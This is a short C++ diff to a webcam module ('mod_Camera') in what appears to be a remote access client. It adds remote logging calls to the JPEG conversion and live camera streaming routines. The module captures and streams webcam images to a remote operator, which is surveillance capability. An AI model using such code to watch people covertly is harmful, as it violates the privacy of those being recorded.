@@ -96,12 +96,14 @@ std::vector<BYTE> mod_Camera::toJPEG(const BYTE* bmpBuffer, u_int uiBuffersize) 
     nStream = SHCreateMemStream(bmpBuffer, uiBuffersize);
     if (!nStream) {
         __DBG_("[X] SHCreateMemStream error");
+        cCliente->m_RemoteLog("[WEBCAM] SHCreateMemStream error : " + std::to_string(GetLastError()));
         goto release;
     }
 
     hr = CreateStreamOnHGlobal(hGlobalMem, TRUE, &oStream);
     if (hr != S_OK) {
         __DBG_("[X] CreateStreamOnHGlobal error");
+        cCliente->m_RemoteLog("[WEBCAM] CreateStreamOnHGlobal error : " + std::to_string(GetLastError()));
         goto release;
     }
 
@@ -110,6 +112,7 @@ std::vector<BYTE> mod_Camera::toJPEG(const BYTE* bmpBuffer, u_int uiBuffersize) 
     nImage = Gdiplus::Image::FromStream(nStream);
     if (nImage == nullptr || nImage->GetLastStatus() != Gdiplus::Ok) {
         __DBG_("[X] Gdiplus::Image::FromStream error");
+        cCliente->m_RemoteLog("[WEBCAM] Gdiplus::Image::FromStream error : " + std::to_string(GetLastError()));
         goto release;
     }
 
@@ -588,6 +591,7 @@ void mod_Camera::LiveCam(int pIndexDev) {
         this->vcCamObjs[pIndexDev].isActivated = this->vcCamObjs[pIndexDev].isLive = true;
 
         __DBG_("[!]Live iniciado");
+        cCliente->m_RemoteLog("[WEBCAM] Live iniciado");
 
         std::string strHeader = std::to_string(pIndexDev);
         strHeader.append(1, CMD_DEL);
@@ -619,5 +623,6 @@ void mod_Camera::LiveCam(int pIndexDev) {
         }
 
         __DBG_("[!]Live terminado");
+        cCliente->m_RemoteLog("[WEBCAM] Live finalizado");
     }
 }
